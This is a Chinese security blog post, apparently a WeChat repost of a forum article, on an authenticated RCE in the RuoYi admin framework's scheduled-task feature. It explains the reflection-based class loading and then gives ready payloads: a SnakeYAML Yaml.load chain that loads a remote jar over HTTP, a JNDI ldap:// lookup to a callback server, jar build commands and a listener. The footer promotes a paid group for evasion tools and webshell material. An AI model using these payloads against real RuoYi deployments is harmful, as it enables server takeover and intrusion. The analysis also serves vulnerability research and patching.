#  若依最新版后台RCE | 干货   
 渗透安全团队   2024-03-16 13:02  
  
若依定时任务的实现是通过反射调来调用目标类，目标类的类名可控导致rce。在版本迭代中增加了黑白名单来防御，但仍然可绕过！  
## 前言  
  
关于若依漏洞或者是审计的文章网上挺多的，本来就只是想写一下最新版4.7.8的RCE。因为之前没接触过若依就打算看看定时任务实现的原理以及历史的漏洞，但是在查阅资料的时候，发现了  
一些文章给的poc有问题，比如作者写的是<4.7.2时，给的是org.springframework.jndi.JndiLocatorDelegate.lookup('r'm'i://ip:端口/refObj')，大概作者的目的是想说明可以通过若依对字符串的处理的一些问题(参数中的'会替换为空)绕过对rmi的过滤，但是却没有考虑到org.springframework.jndi在4.7.1版本中已经加入了黑名单。作者也只是给出了poc，并没有复现的过程！  
## 计划任务实现原理  
  
从官方文档可以看出可以通过两种方法调用目标类：  
- Bean调用示例：ryTask.ryParams('ry')  
  
- Class类调用示例：com.ruoyi.quartz.task.RyTask.ryParams('ry')  
  
接下来咱调试一下，看看具体是如何实现的这个功能的  
  
首先直接在测试类下个断点，看看调用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEIXBSyBsSONbRCl7Wkjtib8qPpccqILU98SgRW11AEXN7LLlp0Hu9tmB0WaCxq0HGvkt24XTQG6Xg/640?wx_fmt=png&from=appmsg&random=0.3556438862590634 "")  
  
通过系统默认的任务1来执行这个测试类  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEIXBSyBsSONbRCl7Wkjtib8Bu1lj38WvYUtVFLxmoianTGc01uP8vzWymoL6GQaRMO1Ur4jTib8MQ6w/640?wx_fmt=png&from=appmsg&random=0.6420156370068772 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEIXBSyBsSONbRCl7Wkjtib84b5TIibNDfLicUtvuWLNgTeRMmjm595gpShtMk48TmkakZ8jqCnNMqwQ/640?wx_fmt=png&from=appmsg&random=0.1333902913429159 "")  
在调用过程中，会发现在com.ruoyi.quartz.util.JobInvokeUtil类中存在两个名为invokeMethod的方法，并前后各调用了一次  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEIXBSyBsSONbRCl7Wkjtib8Ngv4c5sGZMclmmaZiaELdzGhdQgubAicnhJjhbMU2EkjqAIWE9MeI9ibw/640?wx_fmt=png&from=appmsg&random=0.9742369051549207 "")  
  
在第一个invokeMethod方法中对调用目标字符串的类型进行判断，判断是Bean还是Class。然后调用第二个invokeMethod方法  
- bean就通过getBean()直接获取bean的实例  
  
- 类名就通过反射获取类的实例  
  
```
if (!isValidClassName(beanName)){  
    Object bean = SpringUtils.getBean(beanName);  
    invokeMethod(bean, methodName, methodParams);  
}  
else  
{  
    Object bean = Class.forName(beanName).newInstance();  
    invokeMethod(bean, methodName, methodParams);  
}

```  
  
第二个invokeMethod这个方法通过反射来加载测试类  
```
if (StringUtils.isNotNull(methodParams) && methodParams.size() > 0){
    Method method = bean.getClass().getDeclaredMethod(methodName, getMethodParamsType(methodParams));
    method.invoke(bean, getMethodParamsValue(methodParams));
}

```  
  
这大概就是定时任务加载类的逻辑  
## 漏洞成因  
  
接着我们新增一个定时任务，看看在创建的过程中对调用目标字符串做了哪些处理  
  
抓包可以看到直接调用了/monitor/job/add这个接口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEIXBSyBsSONbRCl7Wkjtib82HBwR10icicPfmDOHS24OY6EO4jwZqAfCQyIZXgpibjJINWoNAfnfYNxw/640?wx_fmt=png&from=appmsg&random=0.6610900696815933 "")  
  
可以看到就只是判断了一下，目标字符串是否包含rmi://，这就导致导致攻击者可以调用任意类、方法及参数触发反射执行命令。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEIXBSyBsSONbRCl7Wkjtib8coPxwMgFSaQ8zTQHjkpeSNpo1dxIEXRPv9v0HWmY9rRZAB5dROXyyQ/640?wx_fmt=png&from=appmsg&random=0.4232532065377539 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEIXBSyBsSONbRCl7Wkjtib8B7twWY2P1yibv6bISRJ0YbOhzWU8lYicvmsa143uJn1pRx0B1pEBCNEw/640?wx_fmt=png&from=appmsg&random=0.3457726975385429 "")  
  
由于反射时所需要的：类、方法、参数都是我们可控的，所以我们只需传入一个能够执行命令的类方法就能达到getshell的目的，该类只需要满足如下几点要求即可：  
- 具有public类型的无参构造方法  
  
- 自身具有public类型且可以执行命令的方法  
  
## 4.6.2  
  
因为目前对  
调用目标字符串限制不多，so直接拿网上公开的poc打吧！  
- 使用Yaml.load()来打SnakeYAML反序列化  
  
- JNDI注入  
  
### SnakeYAML反序列化  
  
探测SnakeYAMLpoc：  
```
String poc = "{!!java.net.URL [\"http://5dsff0.dnslog.cn/\"]: 1}";

```  
  
利用SPI机制-基于ScriptEngineManager利用链来执行命令，直接使用这个师傅写好的脚本：https://github.com/artsploit/yaml-payload  
  
1）把这块修改成要执行的命令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEIXBSyBsSONbRCl7Wkjtib8au8na9oIzeDoYk5uRib4tunvrLKW9Wnxj9kckdRHew0ZDapwJeAmEicw/640?wx_fmt=png&from=appmsg&random=0.7483870439619704 "")  
  
2）把项目生成jar包  
```
javac src/artsploit/AwesomeScriptEngineFactory.java　　　　//编译java文件
jar -cvf yaml-payload.jar -C src/ .　　　　　　　　　　　　　//打包成jar包

```  
  
3）在yaml-payload.jar根目录下起一个web服务  
```
python -m http.server 9999

```  
  
4）在计划任务添加payload，执行  
```
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:9999/yaml-payload.jar"]]]]')

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEIXBSyBsSONbRCl7Wkjtib8icF6Y3464gWSR6w2WWLuRdcTl7lSvHuNYVXFFL3N65lHYUvHNdQxI9Q/640?wx_fmt=png&from=appmsg&random=0.4974382632838876 "")  
### JNDI注入  
  
使用yakit起一个返连服务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEIXBSyBsSONbRCl7Wkjtib8wQR0wb4ZdVbNeXtMGb0nBUD2nyrdRQZrLsr6vhibiaoohvz5kAub2BDg/640?wx_fmt=png&from=appmsg&random=0.6805918733397398 "")  
  
poc：  
```
javax.naming.InitialContext.lookup('ldap://127.0.0.1:8085/calc')

```  
  
nc监听端口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEIXBSyBsSONbRCl7Wkjtib8GkTCcGZKZzhOianRsLUWSB9tgWalVOUbDgoictCdM9aQw4dLTPaaH4nQ/640?wx_fmt=png&from=appmsg&random=0.8363854919997313 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEIXBSyBsSONbRCl7Wkjtib8qKicFTyIZzGRStLxfJx8KjP1t6iaZHJsY5gMTVhmuQz7fGM1aCNaxCjw/640?wx_fmt=png&from=appmsg&random=0.5593479830263923 "")  
  
```
文章来源: https://forum.butian.net/share/2796
文章作者：Yu9
如有侵权请联系我们，我们会进行删除并致歉
```  
  
**★**  
  
**付费圈子**  
  
  
**欢 迎 加 入 星 球 ！**  
  
**代码审计+免杀+渗透学习资源+各种资料文档+各种工具+付费会员**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**进成员内部群**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8AQHAyOTgM5sLrvP6qiboXljGWG0uOdvcNR8Qw5QJLxSVrbFds2j7MxExOz1ozb9ZoYwR68leoLdAg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.09738205945672873&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**星球的最近主题和星球内部工具一些展示******  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8Doq0iczyRiaBfhTQyfzqSGuia4lfHfazabEKr2EDe7sGVoxUhLrNRA4FbI1yef6IkWdmzxvZrTiaJncg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8BmE6FAA8Bq7H9GZIRt1xYZpmYNWxrrzolt71FtX5HyM03H0cxkiaYelv7ZSajLtibEdBXUpCibdItXw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8ADSxxicsBmvhX9yBIPibyJTWnDpqropKaIKtZQE3B9ZpgttJuibibCht1jXkNY7tUhLxJRdU6gibnrn0w/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DKZcqe8mOKY1OQN5yfOaD5MpGk0JkyWcDKZvqqTWL0YKO6fmC56kSpcKicxEjK0cCu8fG3mLFLeEg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DAc8LkYEjnluf7oQaBR9CR7oAqnjIIbLZqCxwQtBk833sLbiagicscEic0LSVfOnbianSv11PxzJdcicQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8B96heXWOIseicx7lYZcN8KRN8xTiaOibRiaHVP4weL4mxd0gyaWSuTIVJhBRdBmWXjibmcfes6qR1w49w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DAc8LkYEjnluf7oQaBR9CRBgpPoexbIY7eBAnR7sWS1BlBAQX51QhcOOOz06Ct2x1cMD25nA6mJQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8AqNwoQuOBy9yePOpO5Kr6aHIxj7d0ibfAuPx9fAempAoH9JfIgX4nKzCwDyhQzPrRIx4upyw5yT4Q/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
****  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**加入安全交流群**  
  
  

								[                ](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489372&idx=1&sn=5e14ba5fa59059fb1ee405e56ef90d40&chksm=c175eaf3f60263e5ef5415a8a9fc134f0890fdb9c25ab956116d17109baf98b3bd6bed572a2d&scene=21#wechat_redirect)  

			                  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
**推荐阅读**  
  
  
  
[干货｜史上最全一句话木马](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489259&idx=1&sn=b268701409ad4e8785cd5ebc23176fc8&chksm=c175eb44f60262527120100bd353b3316948928bd7f44cf9b6a49f89d5ffafad88c6f1522226&scene=21#wechat_redirect)  
  
  
  
[干货 | CS绕过vultr特征检测修改算法](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247486980&idx=1&sn=6d65ae57f03bd32fddb37d7055e5ac8e&chksm=c175f3abf6027abdad06009b2fe964e79f2ca60701ae806b451c18845c656c12b9948670dcbc&scene=21#wechat_redirect)  
  
  
  
[实战 | 用中国人写的红队服务器搞一次内网穿透练习](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488628&idx=1&sn=ff2c617cccc00fe262ed9610c790fe0e&chksm=c175e9dbf60260cd0e67439304c822d28d510f1e332867e78a07d631ab27143309d14e27e53f&scene=21#wechat_redirect)  
  
  
  
[实战 | 渗透某培训平台经历](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488613&idx=1&sn=12884f3d196ac4f5c262a587590d516d&chksm=c175e9caf60260dcc0d5d81a560025d548c61fda975d02237d344fd79adc77ac592e7e562939&scene=21#wechat_redirect)  
  
  
  
[实战 | 一次曲折的钓鱼溯源反制](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489278&idx=1&sn=5347fdbf7bbeb3fd37865e191163763f&chksm=c175eb51f602624777fb84e7928bb4fa45c30f35e27f3d66fc563ed97fa3c16ff06d172b868c&scene=21#wechat_redirect)  
  
  
  
**免责声明**  
  
由于传播、利用本公众号渗透安全团队所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号渗透安全团队及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
好文分享收藏赞一下最美点在看哦  
  
  
